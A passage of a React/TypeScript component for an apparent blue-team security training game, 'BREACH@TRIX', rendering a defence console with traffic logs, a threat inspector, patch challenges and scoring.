                            ? "rgba(52,211,153,0.1)"
                            : "#34D399",
                      color:
                        challengeResult === "pass"
                          ? "#34D399"
                          : challengeResult === "running"
                            ? "#34D399"
                            : "#05060f",
                      transition: "all 0.15s",
                      marginBottom: 12,
                    }}
                  >
                    {challengeResult === "running"
                      ? "Validating..."
                      : challengeResult === "pass"
                        ? "✓ Fix Deployed!"
                        : "▶ Run Validator"}
                  </button>

                  {challengeFeedback && (
                    <div
                      style={{
                        padding: "10px 12px",
                        borderRadius: 6,
                        fontSize: 11,
                        lineHeight: 1.6,
                        ...(challengeResult === "pass"
                          ? {
                              background: "rgba(52,211,153,0.08)",
                              border: "1px solid rgba(52,211,153,0.25)",
                              color: "#34D399",
                            }
                          : {
                              background: "rgba(248,113,113,0.08)",
                              border: "1px solid rgba(248,113,113,0.25)",
                              color: "#fca5a5",
                            }),
                      }}
                    >
                      {challengeFeedback}
                    </div>
                  )}
                </div>

                <div style={{ padding: "16px", flex: 1 }}>
                  <div
                    style={{
                      fontSize: 10,
                      fontWeight: 700,
                      letterSpacing: "0.1em",
                      color: "rgba(255,255,255,0.3)",
                      marginBottom: 12,
                    }}
                  >
                    GLOBAL EFFECT ON PASS
                  </div>
                  <ul
                    style={{
                      paddingLeft: 16,
                      margin: 0,
                      display: "flex",
                      flexDirection: "column",
                      gap: 10,
                      fontSize: 11,
                      color: "rgba(255,255,255,0.4)",
                      lineHeight: 1.6,
                    }}
                  >
                    <li>
                      All existing{" "}
                      <span
                        style={{
                          color: challengeType ? SEV_CONFIG.critical.color : "",
                        }}
                      >
                        {challengeType ? TYPE_LABELS[challengeType] : ""}
                      </span>{" "}
                      logs marked as patched
                    </li>
                    <li>
                      New attacks of this type{" "}
                      <strong style={{ color: "#f1f5f9" }}>
                        stop spawning
                      </strong>
                    </li>
                    <li>
                      Score +
                      <strong style={{ color: "#34D399" }}>
                        {challenge.points} pts
                      </strong>{" "}
                      awarded
                    </li>
                  </ul>

                  {challengeResult === "pass" && (
                    <div
                      style={{
                        marginTop: 20,
                        padding: 12,
                        background: "rgba(52,211,153,0.06)",
                        border: "1px solid rgba(52,211,153,0.2)",
                        borderRadius: 6,
                      }}
                    >
                      <div
                        style={{
                          fontSize: 10,
                          fontWeight: 700,
                          color: "#34D399",
                          letterSpacing: "0.08em",
                          marginBottom: 6,
                        }}
                      >
                        ✓ VULNERABILITY CLOSED
                      </div>
                      <div
                        style={{
                          fontSize: 11,
                          color: "rgba(255,255,255,0.4)",
                          lineHeight: 1.55,
                        }}
                      >
                        {challengeType ? TYPE_LABELS[challengeType] : ""}{" "}
                        attacks have been halted globally. Attackers can no
                        longer exploit this vector.
                      </div>
                    </div>
                  )}

                  {/* Scoring reference */}
                  <div style={{ marginTop: 20 }}>
                    <div
                      style={{
                        fontSize: 10,
                        fontWeight: 700,
                        letterSpacing: "0.1em",
                        color: "rgba(255,255,255,0.3)",
                        marginBottom: 10,
                      }}
                    >
                      SCORE TABLE
                    </div>
                    {Object.entries(CHALLENGES).map(([type, ch]) => {
                      const done = patchedTypes.has(type as AttackType);
                      return (
                        <div
                          key={type}
                          style={{
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "6px 0",
                            borderBottom: "1px solid rgba(255,255,255,0.04)",
                            opacity: done ? 0.4 : 1,
                          }}
                        >
                          <span
                            style={{
                              fontSize: 10,
                              color: done
                                ? "#34D399"
                                : "rgba(255,255,255,0.35)",
                            }}
                          >
                            {done ? "✓ " : ""}
                            {TYPE_LABELS[type as AttackType]}
                          </span>
                          <span
                            style={{
                              fontSize: 10,
                              fontWeight: 700,
                              color: done ? "#34D399" : "rgba(255,255,255,0.4)",
                            }}
                          >
                            +{ch!.points}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── TOP BAR ── */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 20px",
          height: 56,
          background: "rgba(0,0,0,0.5)",
          backdropFilter: "blur(12px)",
          borderBottom: bdr,
          flexShrink: 0,
          gap: 12,
          flexWrap: "wrap",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 10,
            flexWrap: "wrap",
          }}
        >
          <div
            style={{
              background: "linear-gradient(135deg,#1d4ed8,#2563eb)",
              color: "#bfdbfe",
              fontSize: 10,
              fontWeight: 700,
              letterSpacing: "0.14em",
              padding: "5px 11px",
              borderRadius: 4,
              boxShadow: "0 0 14px rgba(59,130,246,0.35)",
              flexShrink: 0,
            }}
          >
            BLUE TEAM
          </div>
          <div
            style={{ fontSize: 13, fontWeight: 700, letterSpacing: "0.06em" }}
          >
            BREACH@TRIX{" "}
            <span style={{ color: "rgba(255,255,255,0.28)", fontWeight: 400 }}>
              // DEFENSE CONSOLE
            </span>
          </div>
          {critCount > 0 && (
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: 7,
                background: "rgba(255,51,102,0.1)",
                border: "1px solid rgba(255,51,102,0.28)",
                borderRadius: 5,
                padding: "4px 10px",
              }}
            >
              <div
                style={{
                  width: 6,
                  height: 6,
                  borderRadius: "50%",
                  background: "#FF3366",
                  boxShadow: "0 0 8px #FF3366",
                  animation: "pulse 1.4s infinite",
                }}
              />
              <span
                style={{
                  fontSize: 10,
                  color: "#FF3366",
                  fontWeight: 700,
                  letterSpacing: "0.1em",
                }}
              >
                {critCount} CRITICAL
              </span>
            </div>
          )}
          {[...patchedTypes].map((t) => (
            <div
              key={t}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 4,
                background: "rgba(52,211,153,0.07)",
                border: "1px solid rgba(52,211,153,0.22)",
                borderRadius: 5,
                padding: "4px 9px",
              }}
            >
              <span
                style={{
                  fontSize: 9,
                  color: "#34D399",
                  fontWeight: 700,
                  letterSpacing: "0.08em",
                }}
              >
                ✓ {TYPE_LABELS[t].split(" ")[0]} PATCHED
              </span>
            </div>
          ))}
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ textAlign: "right" }}>
            <div
              style={{
                fontSize: 9,
                color: "rgba(255,255,255,0.3)",
                letterSpacing: "0.1em",
                marginBottom: 3,
              }}
            >
              SCORE
            </div>
            <div
              style={{
                fontSize: 22,
                fontWeight: 700,
                color: "#34D399",
                lineHeight: 1,
              }}
            >
              {score.toLocaleString()}
            </div>
          </div>
          <div style={{ textAlign: "right" }}>
            <div
              style={{
                fontSize: 9,
                color: "rgba(255,255,255,0.3)",
                letterSpacing: "0.1em",
                marginBottom: 3,
              }}
            >
              UPTIME
            </div>
            <div
              style={{
                fontSize: 18,
                fontWeight: 700,
                color: isRunning ? "#FACC15" : "rgba(255,255,255,0.3)",
                lineHeight: 1,
              }}
            >
              {fmtEl(elapsed)}
            </div>
          </div>
          <button
            onClick={() => setLogs([])}
            style={{
              fontFamily: mono,
              fontSize: 11,
              fontWeight: 700,
              padding: "7px 12px",
              borderRadius: 5,
              cursor: "pointer",
              background: "rgba(248,113,113,0.08)",
              border: "1px solid #F87171",
              color: "#F87171",
            }}
          >
            ✕ CLEAR
          </button>
          <button
            onClick={() => setIsRunning((v) => !v)}
            style={{
              fontFamily: mono,
              fontSize: 11,
              fontWeight: 700,
              padding: "7px 12px",
              borderRadius: 5,
              cursor: "pointer",
              ...(isRunning
                ? {
                    background: "rgba(250,204,21,0.08)",
                    border: "1px solid #FACC15",
                    color: "#FACC15",
                  }
                : {
                    background: "rgba(52,211,153,0.08)",
                    border: "1px solid #34D399",
                    color: "#34D399",
                  }),
            }}
          >
            {isRunning ? "⏸ PAUSE" : "▶ RESUME"}
          </button>
        </div>
      </header>

      {/* ── MAIN GRID ── */}
      <div
        style={{
          display: "flex",
          flex: 1,
          minHeight: 0,
          height: "calc(100vh - 56px)",
        }}
      >
        {/* LEFT: Log list */}
        <div
          style={{
            flex: 1,
            display: "flex",
            flexDirection: "column",
            borderRight: bdr,
            minWidth: 0,
          }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              padding: "11px 18px",
              borderBottom: bdr,
              flexShrink: 0,
            }}
          >
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: "0.1em",
                color: "rgba(255,255,255,0.35)",
              }}
            >
              LIVE NETWORK TRAFFIC ({logs.length})
            </span>
            <span style={{ fontSize: 10, color: "rgba(255,255,255,0.2)" }}>
              {isRunning ? "● LIVE" : "⏸ PAUSED"}
            </span>
          </div>
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "96px 80px 120px 1fr 112px",
              padding: "8px 18px",
              background: "rgba(0,0,0,0.4)",
              borderBottom: bdr,
              fontSize: 10,
              fontWeight: 700,
              letterSpacing: "0.1em",
              color: "rgba(255,255,255,0.22)",
              flexShrink: 0,
            }}
          >
            <span>TIMESTAMP</span>
            <span>SEVERITY</span>
            <span>VECTOR</span>
            <span>ATTACKER / DETAILS</span>
            <span style={{ textAlign: "right" }}>STATUS</span>
          </div>
          <div style={{ flex: 1, overflowY: "auto" }}>
            {logs.length === 0 && (
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  height: 200,
                  color: "rgba(255,255,255,0.18)",
                  fontSize: 11,
                  gap: 8,
                }}
              >
                <div style={{ fontSize: 36, opacity: 0.1 }}>◎</div>NO EVENTS
                RECORDED
              </div>
            )}
            {logs.map((log) => {
              const sev = SEV_CONFIG[log.severity];
              const isSel = selected === log.id;
              const isGP = patchedTypes.has(log.type);
              return (
                <div
                  key={log.id}
                  onClick={() => setSelected(isSel ? null : log.id)}
                  style={{
                    display: "grid",
                    gridTemplateColumns: "96px 80px 120px 1fr 112px",
                    alignItems: "center",
                    padding: "10px 18px",
                    borderBottom: "1px solid rgba(255,255,255,0.03)",
                    borderLeft: `3px solid ${isSel ? sev.color : "transparent"}`,
                    background: isSel ? sev.bg : "transparent",
                    cursor: "pointer",
                    opacity: isGP ? 0.28 : 1,
                    transition: "background 0.1s",
                  }}
                >
                  <span
                    style={{ fontSize: 11, color: "rgba(255,255,255,0.3)" }}
                  >
                    {fmt(log.ts)}
                  </span>
                  <div>
                    <span
                      style={{
                        fontSize: 9,
                        fontWeight: 700,
                        letterSpacing: "0.05em",
                        padding: "3px 7px",
                        borderRadius: 3,
                        display: "inline-block",
                        color: sev.color,
                        background: sev.bg,
                        border: `1px solid ${sev.border}`,
                      }}
                    >
                      {sev.label}
                    </span>
                  </div>
                  <span
                    style={{ fontSize: 11, color: "rgba(255,255,255,0.6)" }}
                  >
                    {TYPE_LABELS[log.type]}
                  </span>
                  <div
                    style={{
                      fontSize: 12,
                      color: "rgba(255,255,255,0.38)",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      paddingRight: 14,
                    }}
                  >
                    <span
                      style={{
                        color: sev.color,
                        marginRight: 7,
                        fontWeight: 700,
                      }}
                    >
                      {log.user}
                    </span>
                    {log.detail}
                  </div>
                  <div
                    style={{
                      display: "flex",
                      gap: 3,
                      justifyContent: "flex-end",
                      flexWrap: "wrap",
                    }}
                  >
                    {isGP && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 5px",
                          borderRadius: 3,
                          color: "#34D399",
                          background: "rgba(52,211,153,0.12)",
                          border: "1px solid rgba(52,211,153,0.3)",
                        }}
                      >
                        PATCHED
                      </span>
                    )}
                    {!isGP && log.detected && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 5px",
                          borderRadius: 3,
                          color: "#38BDF8",
                          background: "rgba(56,189,248,0.12)",
                          border: "1px solid rgba(56,189,248,0.3)",
                        }}
                      >
                        ACK
                      </span>
                    )}
                    {!isGP && log.blocked && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 5px",
                          borderRadius: 3,
                          color: "#F87171",
                          background: "rgba(248,113,113,0.12)",
                          border: "1px solid rgba(248,113,113,0.3)",
                        }}
                      >
                        BLK
                      </span>
                    )}
                    {!isGP && log.restored && (
                      <span
                        style={{
                          fontSize: 9,
                          fontWeight: 700,
                          padding: "2px 5px",
                          borderRadius: 3,
                          color: "#A78BFA",
                          background: "rgba(167,139,250,0.12)",
                          border: "1px solid rgba(167,139,250,0.3)",
                        }}
                      >
                        RST
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* RIGHT: Inspector + Ledger */}
        <div
          style={{
            width: 400,
            flexShrink: 0,
            display: "flex",
            flexDirection: "column",
            background: "rgba(0,0,0,0.22)",
          }}
        >
          <div
            style={{ padding: "11px 18px", borderBottom: bdr, flexShrink: 0 }}
          >
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: "0.1em",
                color: "rgba(255,255,255,0.35)",
              }}
            >
              THREAT INSPECTOR
            </span>
          </div>

          <div
            style={{
              padding: "14px 18px",
              borderBottom: bdr,
              overflowY: "auto",
              maxHeight: "65vh",
              flexShrink: 0,
            }}
          >
            {!selectedLog ? (
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  height: 200,
                  color: "rgba(255,255,255,0.18)",
                  fontSize: 11,
                  gap: 10,
                  letterSpacing: "0.05em",
                  textAlign: "center",
                }}
              >
                <div style={{ fontSize: 40, opacity: 0.1 }}>⛊</div>
                AWAITING THREAT SELECTION
                <div style={{ fontSize: 10, color: "rgba(255,255,255,0.1)" }}>
                  Click any row to inspect
                </div>
              </div>
            ) : (
              (() => {
                const sev = SEV_CONFIG[selectedLog.severity];
                const isGP = patchedTypes.has(selectedLog.type);
                return (
                  <div>
                    {/* Banner */}
                    <div
                      style={{
                        background: sev.bg,
                        border: `1px solid ${sev.border}`,
                        borderRadius: 8,
                        padding: 14,
                        marginBottom: 12,
                        boxShadow: `0 4px 20px ${sev.glow}`,
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          marginBottom: 6,
                        }}
                      >
                        <span
                          style={{
                            color: sev.color,
                            fontWeight: 700,
                            fontSize: 11,
                            letterSpacing: "0.06em",
                          }}
                        >
                          {TYPE_LABELS[selectedLog.type]}
                        </span>
                        <span
                          style={{
                            fontSize: 9,
                            fontWeight: 700,
                            padding: "3px 8px",
                            borderRadius: 3,
                            border: `1px solid ${sev.border}`,
                            color: sev.color,
                            background: "rgba(0,0,0,0.3)",
                          }}
                        >
                          {sev.label}
                        </span>
                      </div>
                      <div
                        style={{
                          fontSize: 13,
                          fontWeight: 700,
                          color: sev.color,
                          marginBottom: 5,
                        }}
                      >
                        {selectedLog.user}
                      </div>
                      <div
                        style={{
                          fontSize: 12,
                          lineHeight: 1.6,
                          color: "#f1f5f9",
                          marginBottom: 12,
                        }}
                      >
                        {selectedLog.detail}
                      </div>
                      <div
                        style={{
                          display: "grid",
                          gridTemplateColumns: "1fr 1fr",
                          gap: 8,
                          background: "rgba(0,0,0,0.25)",
                          padding: 10,
                          borderRadius: 6,
                          marginBottom: 10,
                        }}
                      >
                        {[
                          ["SOURCE IP", selectedLog.ip],
                          ["COUNTRY", selectedLog.country],
                          ["PORT", String(selectedLog.port)],
                          ["ENDPOINT", selectedLog.endpoint],
                          ["METHOD", selectedLog.method],
                          ["STATUS", String(selectedLog.statusCode)],
                          ["EVENT ID", selectedLog.id],
                          ["TIME", fmtMs(selectedLog.ts)],
                        ].map(([l, v]) => (
                          <div key={l}>
                            <div
                              style={{
                                fontSize: 9,
                                color: "rgba(255,255,255,0.28)",
                                fontWeight: 700,
                                letterSpacing: "0.08em",
                                marginBottom: 3,
                              }}
                            >
                              {l}
                            </div>
                            <div
                              style={{
                                fontSize: 10,
                                color: "#e2e8f0",
                                wordBreak: "break-all",
                              }}
                            >
                              {v}
                            </div>
                          </div>
                        ))}
                      </div>
                      <div
                        style={{
                          fontSize: 9,
                          color: "rgba(255,255,255,0.28)",
                          fontWeight: 700,
                          letterSpacing: "0.08em",
                          marginBottom: 3,
                        }}
                      >
                        USER AGENT
                      </div>
                      <div
                        style={{
                          fontSize: 10,
                          color: "rgba(255,255,255,0.38)",
                          marginBottom: 10,
                        }}
                      >
                        {selectedLog.userAgent}
                      </div>
                      <div
                        style={{
                          fontSize: 9,
                          color: "rgba(255,255,255,0.28)",
                          fontWeight: 700,
                          letterSpacing: "0.08em",
                          marginBottom: 4,
                        }}
                      >
                        RAW PAYLOAD
                      </div>
                      <div
                        style={{
                          background: "rgba(0,0,0,0.4)",
                          border: "1px solid rgba(255,255,255,0.07)",
                          borderRadius: 5,
                          padding: 8,
                          fontSize: 10,
                          color: "#7dd3fc",
                          whiteSpace: "pre-wrap",
                          wordBreak: "break-all",
                          lineHeight: 1.55,
                        }}
                      >
                        {selectedLog.payload}
                      </div>
                    </div>

                    {isGP ? (
                      <div
                        style={{
                          padding: "10px 14px",
                          background: "rgba(52,211,153,0.07)",
                          border: "1px solid rgba(52,211,153,0.2)",
                          borderRadius: 6,
                          fontSize: 11,
                          color: "#34D399",
                          marginBottom: 10,
                        }}
                      >
                        ✓ {TYPE_LABELS[selectedLog.type]} globally patched —
                        this vector is closed.
                      </div>
                    ) : (
                      <div
                        style={{
                          display: "grid",
                          gridTemplateColumns: "1fr 1fr",
                          gap: 8,
                          marginBottom: 10,
                        }}
                      >
                        {(
                          Object.entries(ACTION_CONFIG) as [
                            DefenseAction,
                            (typeof ACTION_CONFIG)[DefenseAction],
                          ][]
                        ).map(([action, cfg]) => {
                          const isDone =
                            (action === "detect" && selectedLog.detected) ||
                            (action === "patch" && selectedLog.patched) ||
                            (action === "block" && selectedLog.blocked) ||
                            (action === "restore" && selectedLog.restored);
                          const notReady =
                            action === "patch" && !selectedLog.detected;
                          const disabled = isDone || notReady;
                          const isPatch = action === "patch";
                          return (
                            <button
                              key={action}
                              onClick={() => doAction(action)}
                              style={{
                                fontFamily: mono,
                                background: isDone
                                  ? "rgba(0,0,0,0.2)"
                                  : isPatch
                                    ? "rgba(52,211,153,0.06)"
                                    : "rgba(255,255,255,0.02)",
                                border: `1px solid ${isDone ? "rgba(255,255,255,0.06)" : isPatch ? "rgba(52,211,153,0.3)" : "rgba(255,255,255,0.1)"}`,
                                borderRadius: 6,
                                padding: "11px 12px",
                                display: "flex",
                                justifyContent: "space-between",
                                alignItems: "center",
                                cursor: disabled ? "not-allowed" : "pointer",
                                opacity: disabled ? 0.3 : 1,
                                color: "#e2e8f0",
                                transition: "all 0.15s",
                              }}
                            >
                              <div>
                                <div
                                  style={{
                                    fontSize: 11,
                                    fontWeight: 700,
                                    letterSpacing: "0.02em",
                                    marginBottom: 2,
                                    color: isDone
                                      ? "rgba(255,255,255,0.3)"
                                      : isPatch
                                        ? "#34D399"
                                        : "#e2e8f0",
                                  }}
                                >
                                  {cfg.label}
                                </div>
                                <div
                                  style={{
                                    fontSize: 9,
                                    color: "rgba(255,255,255,0.25)",
                                  }}
                                >
                                  {isDone
                                    ? "✓ done"
                                    : notReady
                                      ? "⟳ ack first"
                                      : isPatch
                                        ? "opens editor →"
                                        : cfg.desc.substring(0, 20)}
                                </div>
                              </div>
                              <div
                                style={{
                                  fontSize: 12,
                                  fontWeight: 700,
                                  color: isDone
                                    ? "rgba(255,255,255,0.2)"
                                    : cfg.color,
                                  marginLeft: 8,
                                  flexShrink: 0,
                                }}
                              >
                                +{cfg.points}
                              </div>
                            </button>
                          );
                        })}
                      </div>
                    )}

                    {toast && (
                      <div
                        style={{
                          padding: "9px 12px",
                          borderRadius: 5,
                          fontSize: 11,
                          fontWeight: 700,
                          ...(toast.type === "ok"
                            ? {
                                background: "rgba(52,211,153,0.1)",
                                border: "1px solid rgba(52,211,153,0.3)",
                                color: "#34D399",
                              }
                            : {
                                background: "rgba(248,113,113,0.1)",
                                border: "1px solid rgba(248,113,113,0.3)",
                                color: "#F87171",
                              }),
                        }}
                      >
                        {toast.msg}
                      </div>
                    )}
                  </div>
                );
              })()
            )}
          </div>

          {/* Ledger */}
          <div
            style={{
              padding: "11px 18px",
              borderBottom: bdr,
              flexShrink: 0,
              display: "flex",
              justifyContent: "space-between",
            }}
          >
            <span
              style={{
                fontSize: 10,
                fontWeight: 700,
                letterSpacing: "0.1em",
                color: "rgba(255,255,255,0.35)",
              }}
            >
              RESPONSE LEDGER
            </span>
            <span style={{ fontSize: 10, color: "rgba(255,255,255,0.2)" }}>
              {scoreHistory.length} actions
            </span>
          </div>
          <div style={{ flex: 1, overflowY: "auto", padding: "12px 18px" }}>
            {scoreHistory.length === 0 ? (
              <div
                style={{
                  color: "rgba(255,255,255,0.18)",
                  fontSize: 10,
                  letterSpacing: "0.06em",
                  textAlign: "center",
                  marginTop: 20,
                }}
              >
                No actions recorded yet
              </div>
            ) : (
              scoreHistory.map((h, i) => {
                const cfg = ACTION_CONFIG[h.action];
                return (
                  <div
                    key={i}
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      padding: "9px 0",
                      borderBottom: "1px solid rgba(255,255,255,0.04)",
                    }}
                  >
                    <div>
                      <div
                        style={{
                          color: cfg.color,
                          fontWeight: 700,
                          fontSize: 10,
                          letterSpacing: "0.05em",
                          marginBottom: 3,
                        }}
                      >
                        {cfg.label.toUpperCase()}
                      </div>
                      <div
                        style={{
                          color: "rgba(255,255,255,0.28)",
                          fontSize: 10,
                        }}
                      >
                        {h.detail}
                      </div>
                      <div
                        style={{
                          color: "rgba(255,255,255,0.15)",
                          fontSize: 9,
                          marginTop: 2,
                        }}
                      >
                        {fmt(h.ts)}
                      </div>
                    </div>
                    <div
                      style={{
                        color: "#34D399",
                        fontWeight: 700,
                        fontSize: 13,
                        flexShrink: 0,
                        marginLeft: 8,
                      }}
                    >
                      +{h.points}
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>
      </div>

      <style jsx global>{`
        @import url("https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap");
        * {
          box-sizing: border-box;
        }
        body {
          margin: 0;
        }
        @keyframes pulse {
          0%,
          100% {
            opacity: 1;
            transform: scale(1);
          }
          50% {
            opacity: 0.4;
            transform: scale(0.75);
          }
        }
        @keyframes flash {
          0% {
            opacity: 1;
          }
          100% {
            opacity: 0;
          }
        }
        ::-webkit-scrollbar {
          width: 4px;
        }
        ::-webkit-scrollbar-track {
          background: transparent;
        }
        ::-webkit-scrollbar-thumb {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 4px;
        }
        textarea {
          font-family: "JetBrains Mono", monospace !important;
        }
      `}</style>
    </div>
  );
}
